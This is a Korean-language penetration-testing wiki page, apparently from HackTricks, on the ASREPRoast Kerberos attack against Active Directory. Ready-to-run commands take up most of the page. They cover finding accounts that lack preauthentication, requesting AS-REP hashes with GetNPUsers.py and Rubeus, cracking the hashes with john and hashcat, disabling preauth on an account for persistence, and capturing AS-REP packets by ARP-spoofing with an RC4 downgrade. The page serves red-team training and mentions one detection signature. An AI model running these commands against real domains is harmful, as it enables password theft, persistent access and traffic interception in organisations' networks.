# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast는 **Kerberos 사전 인증 필수 속성**이 없는 사용자를 악용하는 보안 공격입니다. 본질적으로 이 취약점은 공격자가 사용자의 비밀번호 없이 도메인 컨트롤러(DC)에서 사용자 인증을 요청할 수 있게 합니다. 그러면 DC는 사용자의 비밀번호에서 파생된 키로 암호화된 메시지로 응답하며, 공격자는 이를 오프라인에서 크랙하여 사용자의 비밀번호를 알아내려고 시도할 수 있습니다.

이 공격의 주요 요구 사항은 다음과 같습니다:

- **Kerberos 사전 인증 부족**: 대상 사용자는 이 보안 기능이 활성화되어 있지 않아야 합니다.
- **도메인 컨트롤러(DC)와의 연결**: 공격자는 요청을 보내고 암호화된 메시지를 받기 위해 DC에 접근해야 합니다.
- **선택적 도메인 계정**: 도메인 계정을 보유하면 공격자가 LDAP 쿼리를 통해 취약한 사용자를 더 효율적으로 식별할 수 있습니다. 이러한 계정이 없으면 공격자는 사용자 이름을 추측해야 합니다.

#### 취약한 사용자 열거하기 (도메인 자격 증명 필요)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP 메시지 요청
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP 로스팅을 Rubeus로 수행하면 0x17의 암호화 유형과 0의 사전 인증 유형을 가진 4768이 생성됩니다.

### 크래킹
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

**GenericAll** 권한(또는 속성 쓰기 권한)이 있는 사용자에 대해 **preauth**가 필요하지 않도록 강제합니다:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast 자격 증명 없이

공격자는 중간자 위치를 사용하여 AS-REP 패킷을 캡처할 수 있으며, 이는 Kerberos 사전 인증이 비활성화되지 않은 상태에서도 네트워크를 통과합니다. 따라서 VLAN의 모든 사용자에게 작동합니다.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)를 사용하면 이를 수행할 수 있습니다. 또한 이 도구는 Kerberos 협상을 변경하여 클라이언트 워크스테이션이 RC4를 사용하도록 강제합니다.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 참조

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
